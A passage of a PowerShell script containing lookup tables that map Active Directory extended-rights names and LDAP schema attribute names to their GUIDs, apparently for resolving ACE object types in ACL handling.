        "Run-Protect-Admin-Groups-Task" = "7726b9d5-a4b4-4288-a6b2-dce952e80a7f";
        #"Run-Protect_Admin_Groups-Task" = "7726b9d5-a4b4-4288-a6b2-dce952e80a7f";
        "SAM-Enumerate-Entire-Domain" = "91d67418-0135-4acc-8d79-c08e857cfbec";
        "Self-Membership" = "bf9679c0-0de6-11d0-a285-00aa003049e2";
        "Send-As" = "ab721a54-1e2f-11d0-9819-00aa0040529b";
        "Send-To" = "ab721a55-1e2f-11d0-9819-00aa0040529b";
        "Terminal-Server-License-Server" = "5805bc62-bdc9-4428-a5e2-856a0f4c185e";
        "Unexpire-Password" = "ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501";
        "Update-Password-Not-Required-Bit" = "280f369c-67c7-438e-ae98-1d46f3c6f541";
        "Update-Schema-Cache" = "be2bb760-7f46-11d2-b9ad-00c04f79f805";
        "User-Account-Restrictions" = "4c164200-20c0-11d0-a768-00aa006e0529";
        "User-Change-Password" = "ab721a53-1e2f-11d0-9819-00aa0040529b";
        "User-Force-Change-Password" = "00299570-246d-11d0-a768-00aa006e0529";
        "User-Logon" = "5f202010-79a5-11d0-9020-00c04fc2d4cf";
        "Validated-DNS-Host-Name" = "72e39547-7b18-11d1-adef-00c04fd8d5cd";
        "Validated-MS-DS-Additional-DNS-Host-Name" = "80863791-dbe9-4eb8-837e-7f0ab55d9ac7";
        "Validated-MS-DS-Behavior-Version" = "d31a8757-2447-4545-8081-3bb610cacbf2";
        "Validated-SPN" = "f3a64788-5306-11d1-a9c5-0000f80367c1";
        "Web-Information" = "E45795B3-9455-11d1-AEBD-0000F80367C1";
        "msmq-Open-Connector" = "b4e60130-df3f-11d1-9c86-006008764d0e";
        "msmq-Peek" = "06bd3201-df3e-11d1-9c86-006008764d0e";
        "msmq-Peek-Dead-Letter" = "4b6e08c1-df3c-11d1-9c86-006008764d0e";
        "msmq-Peek-computer-Journal" = "4b6e08c3-df3c-11d1-9c86-006008764d0e";
        "msmq-Receive" = "06bd3200-df3e-11d1-9c86-006008764d0e";
        "msmq-Receive-Dead-Letter" = "4b6e08c0-df3c-11d1-9c86-006008764d0e";
        "msmq-Receive-computer-Journal" = "4b6e08c2-df3c-11d1-9c86-006008764d0e";
        "msmq-Receive-journal" = "06bd3203-df3e-11d1-9c86-006008764d0e";
        "msmq-Send" = "06bd3202-df3e-11d1-9c86-006008764d0e";
    }
}


function _Helper-GetLDAPAttributesArray {
    
    <#

        .SYNOPSIS

            Returns the Array of all possible ObjectAceType (LDAP Attributes ONLY)

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all

    #>
    
    return @{
        "account" = "2628a46a-a6ad-4ae0-b854-2b12d9fe6f9e";
        "accountExpires" = "bf967915-0de6-11d0-a285-00aa003049e2";
        "accountNameHistory" = "031952ec-3b72-11d2-90cc-00c04fd91ab1";
        "aCSAggregateTokenRatePerUser" = "7f56127d-5301-11d1-a9c5-0000f80367c1";
        "aCSAllocableRSVPBandwidth" = "7f561283-5301-11d1-a9c5-0000f80367c1";
        "aCSCacheTimeout" = "1cb355a1-56d0-11d1-a9c6-0000f80367c1";
        "aCSDirection" = "7f56127a-5301-11d1-a9c5-0000f80367c1";
        "aCSDSBMDeadTime" = "1cb355a0-56d0-11d1-a9c6-0000f80367c1";
        "aCSDSBMPriority" = "1cb3559e-56d0-11d1-a9c6-0000f80367c1";
        "aCSDSBMRefresh" = "1cb3559f-56d0-11d1-a9c6-0000f80367c1";
        "aCSEnableACSService" = "7f561287-5301-11d1-a9c5-0000f80367c1";
        "aCSEnableRSVPAccounting" = "f072230e-aef5-11d1-bdcf-0000f80367c1";
        "aCSEnableRSVPMessageLogging" = "7f561285-5301-11d1-a9c5-0000f80367c1";
        "aCSEventLogLevel" = "7f561286-5301-11d1-a9c5-0000f80367c1";
        "aCSIdentityName" = "dab029b6-ddf7-11d1-90a5-00c04fd91ab1";
        "aCSMaxAggregatePeakRatePerUser" = "f072230c-aef5-11d1-bdcf-0000f80367c1";
        "aCSMaxDurationPerFlow" = "7f56127e-5301-11d1-a9c5-0000f80367c1";
        "aCSMaximumSDUSize" = "87a2d8f9-3b90-11d2-90cc-00c04fd91ab1";
        "aCSMaxNoOfAccountFiles" = "f0722310-aef5-11d1-bdcf-0000f80367c1";
        "aCSMaxNoOfLogFiles" = "1cb3559c-56d0-11d1-a9c6-0000f80367c1";
        "aCSMaxPeakBandwidth" = "7f561284-5301-11d1-a9c5-0000f80367c1";
        "aCSMaxPeakBandwidthPerFlow" = "7f56127c-5301-11d1-a9c5-0000f80367c1";
        "aCSMaxSizeOfRSVPAccountFile" = "f0722311-aef5-11d1-bdcf-0000f80367c1";
        "aCSMaxSizeOfRSVPLogFile" = "1cb3559d-56d0-11d1-a9c6-0000f80367c1";
        "aCSMaxTokenBucketPerFlow" = "81f6e0df-3b90-11d2-90cc-00c04fd91ab1";
        "aCSMaxTokenRatePerFlow" = "7f56127b-5301-11d1-a9c5-0000f80367c1";
        "aCSMinimumDelayVariation" = "9c65329b-3b90-11d2-90cc-00c04fd91ab1";
        "aCSMinimumLatency" = "9517fefb-3b90-11d2-90cc-00c04fd91ab1";
        "aCSMinimumPolicedSize" = "8d0e7195-3b90-11d2-90cc-00c04fd91ab1";
        "aCSNonReservedMaxSDUSize" = "aec2cfe3-3b90-11d2-90cc-00c04fd91ab1";
        "aCSNonReservedMinPolicedSize" = "b6873917-3b90-11d2-90cc-00c04fd91ab1";
        "aCSNonReservedPeakRate" = "a331a73f-3b90-11d2-90cc-00c04fd91ab1";
        "aCSNonReservedTokenSize" = "a916d7c9-3b90-11d2-90cc-00c04fd91ab1";
        "aCSNonReservedTxLimit" = "1cb355a2-56d0-11d1-a9c6-0000f80367c1";
        "aCSNonReservedTxSize" = "f072230d-aef5-11d1-bdcf-0000f80367c1";
        "aCSPermissionBits" = "7f561282-5301-11d1-a9c5-0000f80367c1";
        "aCSPolicy" = "7f561288-5301-11d1-a9c5-0000f80367c1";
        "aCSPolicyName" = "1cb3559a-56d0-11d1-a9c6-0000f80367c1";
        "aCSPriority" = "7f561281-5301-11d1-a9c5-0000f80367c1";
        "aCSResourceLimits" = "2e899b04-2834-11d3-91d4-0000f87a57d4";
        "aCSRSVPAccountFilesLocation" = "f072230f-aef5-11d1-bdcf-0000f80367c1";
        "aCSRSVPLogFilesLocation" = "1cb3559b-56d0-11d1-a9c6-0000f80367c1";
        "aCSServerList" = "7cbd59a5-3b90-11d2-90cc-00c04fd91ab1";
        "aCSServiceType" = "7f56127f-5301-11d1-a9c5-0000f80367c1";
        "aCSSubnet" = "7f561289-5301-11d1-a9c5-0000f80367c1";
        "aCSTimeOfDay" = "7f561279-5301-11d1-a9c5-0000f80367c1";
        "aCSTotalNoOfFlows" = "7f561280-5301-11d1-a9c5-0000f80367c1";
        "activationSchedule" = "bf967916-0de6-11d0-a285-00aa003049e2";
        "activationStyle" = "bf967917-0de6-11d0-a285-00aa003049e2";
        "addIn" = "a8df74aa-c5ea-11d1-bbcb-0080c76670c0";
        "additionalTrustedServiceNames" = "032160be-9824-11d1-aec0-0000f80367c1";
        "addressBookContainer" = "3e74f60f-3e73-11d1-a9c0-0000f80367c1";
        "addressBookRoots" = "f70b6e48-06f4-11d2-aa53-00c04fd7d83a";
        "addressBookRoots2" = "508ca374-a511-4e4e-9f4f-856f61a6b7e4";
        "addressEntryDisplayTable" = "5fd42461-1262-11d0-a060-00aa006c33ed";
        "addressEntryDisplayTableMSDOS" = "5fd42462-1262-11d0-a060-00aa006c33ed";
        "addressSyntax" = "5fd42463-1262-11d0-a060-00aa006c33ed";
        "addressTemplate" = "5fd4250a-1262-11d0-a060-00aa006c33ed";
        "addressType" = "5fd42464-1262-11d0-a060-00aa006c33ed";
        "addrType" = "a8df74ab-c5ea-11d1-bbcb-0080c76670c0";
        "aDMD" = "a8df7390-c5ea-11d1-bbcb-0080c76670c0";
        "adminContextMenu" = "553fd038-f32e-11d0-b0bc-00c04fd8dca6";
        "adminCount" = "bf967918-0de6-11d0-a285-00aa003049e2";
        "adminDescription" = "bf967919-0de6-11d0-a285-00aa003049e2";
        "adminDisplayName" = "bf96791a-0de6-11d0-a285-00aa003049e2";
        "adminExtension" = "a8df74ac-c5ea-11d1-bbcb-0080c76670c0";
        "adminExtensionDLL" = "a8df7391-c5ea-11d1-bbcb-0080c76670c0";
        "adminMultiselectPropertyPages" = "18f9b67d-5ac6-4b3b-97db-d0a406afb7ba";
        "adminPropertyPages" = "52458038-ca6a-11d0-afff-0000f80367c1";
        "allowedAttributes" = "9a7ad940-ca53-11d1-bbd0-0080c76670c0";
        "allowedAttributesEffective" = "9a7ad941-ca53-11d1-bbd0-0080c76670c0";
        "allowedChildClasses" = "9a7ad942-ca53-11d1-bbd0-0080c76670c0";
        "allowedChildClassesEffective" = "9a7ad943-ca53-11d1-bbd0-0080c76670c0";
        "altRecipient" = "bf96791e-0de6-11d0-a285-00aa003049e2";
        "altRecipientBL" = "bf96791f-0de6-11d0-a285-00aa003049e2";
        "altSecurityIdentities" = "00fbf30c-91fe-11d1-aebc-0000f80367c1";
        "anonymousAccess" = "a8df7392-c5ea-11d1-bbcb-0080c76670c0";
        "anonymousAccount" = "a8df7393-c5ea-11d1-bbcb-0080c76670c0";
        "aNR" = "45b01500-c419-11d1-bbc9-0080c76670c0";
        "applicationEntity" = "3fdfee4f-47f4-11d1-a9c3-0000f80367c1";
        "applicationName" = "dd712226-10e4-11d0-a05f-00aa006c33ed";
        "applicationProcess" = "5fd4250b-1262-11d0-a060-00aa006c33ed";
        "applicationSettings" = "f780acc1-56f0-11d1-a9c6-0000f80367c1";
        "applicationSiteSettings" = "19195a5c-6da0-11d0-afd3-00c04fd930c9";
        "applicationVersion" = "ddc790ac-af4d-442a-8f0f-a1d4caa7dd92";
        "appliesTo" = "8297931d-86d3-11d0-afda-00c04fd930c9";
        "appSchemaVersion" = "96a7dd65-9118-11d1-aebc-0000f80367c1";
        "assetNumber" = "ba305f75-47e3-11d0-a1a6-00c04fd930c9";
        "assistant" = "0296c11c-40da-11d1-a9c0-0000f80367c1";
        "associatedDomain" = "3320fc38-c379-4c17-a510-1bdf6133c5da";
        "associatedName" = "f7fbfc45-85ab-42a4-a435-780e62f7858b";
        "associationLifetime" = "a8df7396-c5ea-11d1-bbcb-0080c76670c0";
        "assocNTAccount" = "398f63c0-ca60-11d1-bbd1-0000f81f10c0";
        "assocRemoteDXA" = "16775789-47f3-11d1-a9c3-0000f80367c1";
        "attributeCertificate" = "1677578b-47f3-11d1-a9c3-0000f80367c1";
        "attributeCertificateAttribute" = "fa4693bb-7bc2-4cb9-81a8-c99c43b7905e";
        "attributeDisplayNames" = "cb843f80-48d9-11d1-a9c3-0000f80367c1";
        "attributeID" = "bf967922-0de6-11d0-a285-00aa003049e2";
        "attributeSchema" = "bf967a80-0de6-11d0-a285-00aa003049e2";
        "attributeSecurityGUID" = "bf967924-0de6-11d0-a285-00aa003049e2";
        "attributeSyntax" = "bf967925-0de6-11d0-a285-00aa003049e2";
        "attributeTypes" = "9a7ad944-ca53-11d1-bbd0-0080c76670c0";
        "audio" = "d0e1d224-e1a0-42ce-a2da-793ba5244f35";
        "auditingPolicy" = "6da8a4fe-0e52-11d0-a286-00aa003049e2";
        "authenticationOptions" = "bf967928-0de6-11d0-a285-00aa003049e2";
        "authOrig" = "a8df7397-c5ea-11d1-bbcb-0080c76670c0";
        "authOrigBL" = "a8df7398-c5ea-11d1-bbcb-0080c76670c0";
        "authorityRevocationList" = "1677578d-47f3-11d1-a9c3-0000f80367c1";
        "authorizedDomain" = "a8df739a-c5ea-11d1-bbcb-0080c76670c0";
        "authorizedPassword" = "a8df739b-c5ea-11d1-bbcb-0080c76670c0";
        "authorizedUser" = "a8df739d-c5ea-11d1-bbcb-0080c76670c0";
        "autoReply" = "bf967929-0de6-11d0-a285-00aa003049e2";
        "autoReplyMessage" = "bf96792a-0de6-11d0-a285-00aa003049e2";
        "auxiliaryClass" = "bf96792c-0de6-11d0-a285-00aa003049e2";
        "availableAuthorizationPackages" = "a8df739e-c5ea-11d1-bbcb-0080c76670c0";
        "availableDistributions" = "a8df739f-c5ea-11d1-bbcb-0080c76670c0";
        "badPasswordTime" = "bf96792d-0de6-11d0-a285-00aa003049e2";
        "badPwdCount" = "bf96792e-0de6-11d0-a285-00aa003049e2";
        "birthLocation" = "1f0075f9-7e40-11d0-afd6-00c04fd930c9";
        "bootableDevice" = "4bcb2477-4bb3-4545-a9fc-fb66e136b435";
        "bootFile" = "e3f3cb4e-0f20-42eb-9703-d2ff26e52667";
        "bootParameter" = "d72a0750-8c7c-416e-8714-e65f11e908be";
        "bridgeheadServerListBL" = "d50c2cdb-8951-11d1-aebc-0000f80367c1";
        "bridgeheadServers" = "a8df73a0-c5ea-11d1-bbcb-0080c76670c0";
        "bridgeheadTransportList" = "d50c2cda-8951-11d1-aebc-0000f80367c1";
        "buildingName" = "f87fa54b-b2c5-4fd7-88c0-daccb21d93c5";
        "builtinCreationTime" = "bf96792f-0de6-11d0-a285-00aa003049e2";
        "builtinDomain" = "bf967a81-0de6-11d0-a285-00aa003049e2";
        "builtinModifiedCount" = "bf967930-0de6-11d0-a285-00aa003049e2";
        "businessCategory" = "bf967931-0de6-11d0-a285-00aa003049e2";
        "businessRoles" = "f0f8ff87-1191-11d0-a060-00aa006c33ed";
        "bytesPerMinute" = "ba305f76-47e3-11d0-a1a6-00c04fd930c9";
        "c" = "bf967945-0de6-11d0-a285-00aa003049e2";
        "cACertificate" = "bf967932-0de6-11d0-a285-00aa003049e2";
        "cACertificateDN" = "963d2740-48be-11d1-a9c3-0000f80367c1";
        "cAConnect" = "963d2735-48be-11d1-a9c3-0000f80367c1";
        "canonicalName" = "9a7ad945-ca53-11d1-bbd0-0080c76670c0";
        "canPreserveDNs" = "a8df73a9-c5ea-11d1-bbcb-0080c76670c0";
        "canUpgradeScript" = "d9e18314-8939-11d1-aebc-0000f80367c1";
        "carLicense" = "d4159c92-957d-4a87-8a67-8d2934e01649";
        "catalogs" = "7bfdcb81-4807-11d1-a9c3-0000f80367c1";
        "categories" = "7bfdcb7e-4807-11d1-a9c3-0000f80367c1";
        "categoryId" = "7d6c0e94-7e20-11d0-afd6-00c04fd930c9";
        "categoryRegistration" = "7d6c0e9d-7e20-11d0-afd6-00c04fd930c9";
        "cAUsages" = "963d2738-48be-11d1-a9c3-0000f80367c1";
        "cAWEBURL" = "963d2736-48be-11d1-a9c3-0000f80367c1";
        "certificateAuthorityObject" = "963d2732-48be-11d1-a9c3-0000f80367c1";
        "certificateChainV3" = "a8df73aa-c5ea-11d1-bbcb-0080c76670c0";
        "certificateRevocationList" = "1677579f-47f3-11d1-a9c3-0000f80367c1";
        "certificateRevocationListV1" = "a8df73ab-c5ea-11d1-bbcb-0080c76670c0";
        "certificateRevocationListV3" = "a8df73ac-c5ea-11d1-bbcb-0080c76670c0";
        "certificateTemplates" = "2a39c5b1-8960-11d1-aebc-0000f80367c1";
        "certificationAuthority" = "3fdfee50-47f4-11d1-a9c3-0000f80367c1";
        "characterSet" = "a8df73ad-c5ea-11d1-bbcb-0080c76670c0";
        "characterSetList" = "a8df73ae-c5ea-11d1-bbcb-0080c76670c0";
        "classDisplayName" = "548e1c22-dea6-11d0-b010-0000f80367c1";
        "classRegistration" = "bf967a82-0de6-11d0-a285-00aa003049e2";
        "classSchema" = "bf967a83-0de6-11d0-a285-00aa003049e2";
        "classStore" = "bf967a84-0de6-11d0-a285-00aa003049e2";
        "clientAccessEnabled" = "a8df73af-c5ea-11d1-bbcb-0080c76670c0";
        "clockAlertOffset" = "a8df73b0-c5ea-11d1-bbcb-0080c76670c0";
        "clockAlertRepair" = "a8df73b1-c5ea-11d1-bbcb-0080c76670c0";
        "clockWarningOffset" = "a8df73b2-c5ea-11d1-bbcb-0080c76670c0";
        "clockWarningRepair" = "a8df73b3-c5ea-11d1-bbcb-0080c76670c0";
        "cn" = "bf96793f-0de6-11d0-a285-00aa003049e2";
        "co" = "f0f8ffa7-1191-11d0-a060-00aa006c33ed";
        "codePage" = "bf967938-0de6-11d0-a285-00aa003049e2";
        "cOMClassID" = "bf96793b-0de6-11d0-a285-00aa003049e2";
        "cOMCLSID" = "281416d9-1968-11d0-a28f-00aa003049e2";
        "comConnectionPoint" = "bf967a85-0de6-11d0-a285-00aa003049e2";
        "cOMInterfaceID" = "bf96793c-0de6-11d0-a285-00aa003049e2";
        "comment" = "bf967a6a-0de6-11d0-a285-00aa003049e2";
        "cOMOtherProgId" = "281416dd-1968-11d0-a28f-00aa003049e2";
        "company" = "f0f8ff88-1191-11d0-a060-00aa006c33ed";
        "cOMProgID" = "bf96793d-0de6-11d0-a285-00aa003049e2";
        "compromisedKeyList" = "167757a9-47f3-11d1-a9c3-0000f80367c1";
        "computer" = "bf967a86-0de6-11d0-a285-00aa003049e2";
        "computerName" = "a8df73b4-c5ea-11d1-bbcb-0080c76670c0";
        "cOMTreatAsClassId" = "281416db-1968-11d0-a28f-00aa003049e2";
        "cOMTypelibId" = "281416de-1968-11d0-a28f-00aa003049e2";
        "cOMUniqueLIBID" = "281416da-1968-11d0-a28f-00aa003049e2";
        "configuration" = "bf967a87-0de6-11d0-a285-00aa003049e2";
        "connectedDomains" = "a8df73b5-c5ea-11d1-bbcb-0080c76670c0";
        "connectionListFilter" = "a8df73b6-c5ea-11d1-bbcb-0080c76670c0";
        "connectionListFilterType" = "a8df73b7-c5ea-11d1-bbcb-0080c76670c0";
        "connectionPoint" = "5cb41ecf-0e4c-11d0-a286-00aa003049e2";
        "contact" = "5cb41ed0-0e4c-11d0-a286-00aa003049e2";
        "container" = "bf967a8b-0de6-11d0-a285-00aa003049e2";
        "containerInfo" = "bf967942-0de6-11d0-a285-00aa003049e2";
        "contentIndexingAllowed" = "bf967943-0de6-11d0-a285-00aa003049e2";
        "contentType" = "a8df73b9-c5ea-11d1-bbcb-0080c76670c0";
        "contextMenu" = "4d8601ee-ac85-11d0-afe3-00c04fd930c9";
        "controlAccessRight" = "8297931e-86d3-11d0-afda-00c04fd930c9";
        "controlAccessRights" = "6da8a4fc-0e52-11d0-a286-00aa003049e2";
        "controlMsgFolderID" = "a8df73ba-c5ea-11d1-bbcb-0080c76670c0";
        "controlMsgRules" = "a8df73bb-c5ea-11d1-bbcb-0080c76670c0";
        "cost" = "bf967944-0de6-11d0-a285-00aa003049e2";
        "country" = "bf967a8c-0de6-11d0-a285-00aa003049e2";
        "countryCode" = "5fd42471-1262-11d0-a060-00aa006c33ed";
        "createDialog" = "2b09958a-8931-11d1-aebc-0000f80367c1";
        "createTimeStamp" = "2df90d73-009f-11d2-aa4c-00c04fd7d83a";
        "createWizardExt" = "2b09958b-8931-11d1-aebc-0000f80367c1";
        "creationTime" = "bf967946-0de6-11d0-a285-00aa003049e2";
        "creationWizard" = "4d8601ed-ac85-11d0-afe3-00c04fd930c9";
        "creator" = "7bfdcb85-4807-11d1-a9c3-0000f80367c1";
        "cRLDistributionPoint" = "167758ca-47f3-11d1-a9c3-0000f80367c1";
        "cRLObject" = "963d2737-48be-11d1-a9c3-0000f80367c1";
        "cRLPartitionedRevocationList" = "963d2731-48be-11d1-a9c3-0000f80367c1";
        "crossCertificateCRL" = "a8df73bc-c5ea-11d1-bbcb-0080c76670c0";
        "crossCertificatePair" = "167757b2-47f3-11d1-a9c3-0000f80367c1";
        "crossRef" = "bf967a8d-0de6-11d0-a285-00aa003049e2";
        "crossRefContainer" = "ef9e60e0-56f7-11d1-a9c6-0000f80367c1";
        "currentLocation" = "1f0075fc-7e40-11d0-afd6-00c04fd930c9";
        "currentParentCA" = "963d273f-48be-11d1-a9c3-0000f80367c1";
        "currentValue" = "bf967947-0de6-11d0-a285-00aa003049e2";
        "currMachineId" = "1f0075fe-7e40-11d0-afd6-00c04fd930c9";
        "dBCSPwd" = "bf96799c-0de6-11d0-a285-00aa003049e2";
        "dc" = "19195a55-6da0-11d0-afd3-00c04fd930c9";
        "defaultClassStore" = "bf967948-0de6-11d0-a285-00aa003049e2";
        "defaultGroup" = "720bc4e2-a54a-11d0-afdf-00c04fd930c9";
        "defaultHidingValue" = "b7b13116-b82e-11d0-afee-0000f80367c1";
        "defaultLocalPolicyObject" = "bf96799f-0de6-11d0-a285-00aa003049e2";
        "defaultMessageFormat" = "a8df73bd-c5ea-11d1-bbcb-0080c76670c0";
        "defaultObjectCategory" = "26d97367-6070-11d1-a9c6-0000f80367c1";
        "defaultPriority" = "281416c8-1968-11d0-a28f-00aa003049e2";
        "defaultSecurityDescriptor" = "807a6d30-1669-11d0-a064-00aa006c33ed";
        "delegateUser" = "a8df73be-c5ea-11d1-bbcb-0080c76670c0";
        "deletedItemFlags" = "167757c7-47f3-11d1-a9c3-0000f80367c1";
        "delivContLength" = "bf96794a-0de6-11d0-a285-00aa003049e2";
        "delivEITs" = "bf96794b-0de6-11d0-a285-00aa003049e2";
        "deliverAndRedirect" = "bf96794d-0de6-11d0-a285-00aa003049e2";
        "deliveryMechanism" = "bf96794e-0de6-11d0-a285-00aa003049e2";
        "delivExtContTypes" = "bf96794c-0de6-11d0-a285-00aa003049e2";
        "deltaRevocationList" = "167757b5-47f3-11d1-a9c3-0000f80367c1";
        "department" = "bf96794f-0de6-11d0-a285-00aa003049e2";
        "departmentNumber" = "be9ef6ee-cbc7-4f22-b27b-96967e7ee585";
        "description" = "bf967950-0de6-11d0-a285-00aa003049e2";
        "desktopProfile" = "eea65906-8ac6-11d0-afda-00c04fd930c9";
        "destinationIndicator" = "bf967951-0de6-11d0-a285-00aa003049e2";
        "device" = "bf967a8e-0de6-11d0-a285-00aa003049e2";
        "dfsConfiguration" = "8447f9f2-1027-11d0-a05f-00aa006c33ed";
        "dHCPClass" = "963d2756-48be-11d1-a9c3-0000f80367c1";
        "dhcpClasses" = "963d2750-48be-11d1-a9c3-0000f80367c1";
        "dhcpFlags" = "963d2741-48be-11d1-a9c3-0000f80367c1";
        "dhcpIdentification" = "963d2742-48be-11d1-a9c3-0000f80367c1";
        "dhcpMask" = "963d2747-48be-11d1-a9c3-0000f80367c1";
        "dhcpMaxKey" = "963d2754-48be-11d1-a9c3-0000f80367c1";
        "dhcpObjDescription" = "963d2744-48be-11d1-a9c3-0000f80367c1";
        "dhcpObjName" = "963d2743-48be-11d1-a9c3-0000f80367c1";
        "dhcpOptions" = "963d274f-48be-11d1-a9c3-0000f80367c1";
        "dhcpProperties" = "963d2753-48be-11d1-a9c3-0000f80367c1";
        "dhcpRanges" = "963d2748-48be-11d1-a9c3-0000f80367c1";
        "dhcpReservations" = "963d274a-48be-11d1-a9c3-0000f80367c1";
        "dhcpServers" = "963d2745-48be-11d1-a9c3-0000f80367c1";
        "dhcpSites" = "963d2749-48be-11d1-a9c3-0000f80367c1";
        "dhcpState" = "963d2752-48be-11d1-a9c3-0000f80367c1";
        "dhcpSubnets" = "963d2746-48be-11d1-a9c3-0000f80367c1";
        "dhcpType" = "963d273b-48be-11d1-a9c3-0000f80367c1";
        "dhcpUniqueKey" = "963d273a-48be-11d1-a9c3-0000f80367c1";
        "dhcpUpdateTime" = "963d2755-48be-11d1-a9c3-0000f80367c1";
        "diagnosticRegKey" = "bf967952-0de6-11d0-a285-00aa003049e2";
        "directReports" = "bf967a1c-0de6-11d0-a285-00aa003049e2";
        "disabledGatewayProxy" = "a8df73c0-c5ea-11d1-bbcb-0080c76670c0";
        "displayName" = "bf967953-0de6-11d0-a285-00aa003049e2";
        "displayNamePrintable" = "bf967954-0de6-11d0-a285-00aa003049e2";
        "displaySpecifier" = "e0fa1e8a-9b45-11d0-afdd-00c04fd930c9";
        "displayTemplate" = "5fd4250c-1262-11d0-a060-00aa006c33ed";
        "distinguishedName" = "bf9679e4-0de6-11d0-a285-00aa003049e2";
        "dITContentRules" = "9a7ad946-ca53-11d1-bbd0-0080c76670c0";
        "division" = "fe6136a0-2073-11d0-a9c2-00aa006c33ed";
        "dLMemberRule" = "a8df73c6-c5ea-11d1-bbcb-0080c76670c0";
        "dLMemDefault" = "89d5319c-b09e-11d2-aa06-00c04f8eedd8";
        "dLMemRejectPerms" = "a8df73c2-c5ea-11d1-bbcb-0080c76670c0";
        "dLMemRejectPermsBL" = "a8df73c3-c5ea-11d1-bbcb-0080c76670c0";
        "dLMemSubmitPerms" = "a8df73c4-c5ea-11d1-bbcb-0080c76670c0";
        "dLMemSubmitPermsBL" = "a8df73c5-c5ea-11d1-bbcb-0080c76670c0";
        "dMD" = "bf967a8f-0de6-11d0-a285-00aa003049e2";
        "dMDLocation" = "f0f8ff8b-1191-11d0-a060-00aa006c33ed";
        "dmdName" = "167757b9-47f3-11d1-a9c3-0000f80367c1";
        "dnQualifier" = "167758c6-47f3-11d1-a9c3-0000f80367c1";
        "dNReferenceUpdate" = "2df90d86-009f-11d2-aa4c-00c04fd7d83a";
        "dnsAllowDynamic" = "e0fa1e65-9b45-11d0-afdd-00c04fd930c9";
        "dnsAllowXFR" = "e0fa1e66-9b45-11d0-afdd-00c04fd930c9";
        "dNSHostName" = "72e39547-7b18-11d1-adef-00c04fd8d5cd";
        "dnsNode" = "e0fa1e8c-9b45-11d0-afdd-00c04fd930c9";
        "dnsNotifySecondaries" = "e0fa1e68-9b45-11d0-afdd-00c04fd930c9";
        "dNSProperty" = "675a15fe-3b70-11d2-90cc-00c04fd91ab1";
        "dnsRecord" = "e0fa1e69-9b45-11d0-afdd-00c04fd930c9";
        "dnsRoot" = "bf967959-0de6-11d0-a285-00aa003049e2";
        "dnsSecureSecondaries" = "e0fa1e67-9b45-11d0-afdd-00c04fd930c9";
        "dNSTombstoned" = "d5eb2eb7-be4e-463b-a214-634a44d7392e";
        "dnsZone" = "e0fa1e8b-9b45-11d0-afdd-00c04fd930c9";
        "dnsZoneScope" = "696f8a61-2d3f-40ce-a4b3-e275dfcc49c5";
        "dnsZoneScopeContainer" = "f2699093-f25a-4220-9deb-03df4cc4a9c5";
        "document" = "39bad96d-c2d6-4baf-88ab-7e4207600117";
        "documentAuthor" = "f18a8e19-af5f-4478-b096-6f35c27eb83f";
        "documentIdentifier" = "0b21ce82-ff63-46d9-90fb-c8b9f24e97b9";
        "documentLocation" = "b958b14e-ac6d-4ec4-8892-be70b69f7281";
        "documentPublisher" = "170f09d7-eb69-448a-9a30-f1afecfd32d7";
        "documentSeries" = "7a2be07c-302f-4b96-bc90-0795d66885f8";
        "documentTitle" = "de265a9c-ff2c-47b9-91dc-6e6fe2c43062";
        "documentVersion" = "94b3a8a9-d613-4cec-9aad-5fbcc1046b43";
        "domain" = "19195a5a-6da0-11d0-afd3-00c04fd930c9";
        "domainCAs" = "7bfdcb7a-4807-11d1-a9c3-0000f80367c1";
        "domainCrossRef" = "b000ea7b-a086-11d0-afdd-00c04fd930c9";
        "domainDefAltRecip" = "167757bb-47f3-11d1-a9c3-0000f80367c1";
        "domainDNS" = "19195a5b-6da0-11d0-afd3-00c04fd930c9";
        "domainID" = "963d2734-48be-11d1-a9c3-0000f80367c1";
        "domainIdentifier" = "7f561278-5301-11d1-a9c5-0000f80367c1";
        "domainName" = "a8df73c8-c5ea-11d1-bbcb-0080c76670c0";
        "domainPolicy" = "bf967a99-0de6-11d0-a285-00aa003049e2";
        "domainPolicyObject" = "bf96795d-0de6-11d0-a285-00aa003049e2";
        "domainPolicyReference" = "80a67e2a-9f22-11d0-afdd-00c04fd930c9";
        "domainRelatedObject" = "8bfd2d3d-efda-4549-852c-f85e137aedc6";
        "domainReplica" = "bf96795e-0de6-11d0-a285-00aa003049e2";
        "domainWidePolicy" = "80a67e29-9f22-11d0-afdd-00c04fd930c9";
        "doOABVersion" = "a8df73c7-c5ea-11d1-bbcb-0080c76670c0";
        "drink" = "1a1aa5b5-262e-4df6-af04-2cf6b0d80048";
        "driverName" = "281416c5-1968-11d0-a28f-00aa003049e2";
        "driverVersion" = "ba305f6e-47e3-11d0-a1a6-00c04fd930c9";
        "dSA" = "3fdfee52-47f4-11d1-a9c3-0000f80367c1";
        "dSASignature" = "167757bc-47f3-11d1-a9c3-0000f80367c1";
        "dSCorePropagationData" = "d167aa4b-8b08-11d2-9939-0000f87a57d4";
        "dSHeuristics" = "f0f8ff86-1191-11d0-a060-00aa006c33ed";
        "dSUIAdminMaximum" = "ee8d0ae0-6f91-11d2-9905-0000f87a57d4";
        "dSUIAdminNotification" = "f6ea0a94-6f91-11d2-9905-0000f87a57d4";
        "dSUISettings" = "09b10f14-6f93-11d2-9905-0000f87a57d4";
        "dSUIShellMaximum" = "fcca766a-6f91-11d2-9905-0000f87a57d4";
        "dXAAdminCopy" = "a8df73c9-c5ea-11d1-bbcb-0080c76670c0";
        "dXAAdminForward" = "167757be-47f3-11d1-a9c3-0000f80367c1";
        "dXAAdminUpdate" = "a8df73ca-c5ea-11d1-bbcb-0080c76670c0";
        "dXAAppendReqCN" = "a8df73cb-c5ea-11d1-bbcb-0080c76670c0";
        "dXAConfContainerList" = "a8df73cc-c5ea-11d1-bbcb-0080c76670c0";
        "dXAConfReqTime" = "a8df73cd-c5ea-11d1-bbcb-0080c76670c0";
        "dXAConfSeq" = "a8df73ce-c5ea-11d1-bbcb-0080c76670c0";
        "dXAConfSeqUSN" = "a8df73cf-c5ea-11d1-bbcb-0080c76670c0";
        "dXAExchangeOptions" = "a8df73d0-c5ea-11d1-bbcb-0080c76670c0";
        "dXAExportNow" = "a8df73d1-c5ea-11d1-bbcb-0080c76670c0";
        "dXAImportNow" = "a8df73d5-c5ea-11d1-bbcb-0080c76670c0";
        "dXAImpSeq" = "a8df73d2-c5ea-11d1-bbcb-0080c76670c0";
        "dXAImpSeqTime" = "a8df73d3-c5ea-11d1-bbcb-0080c76670c0";
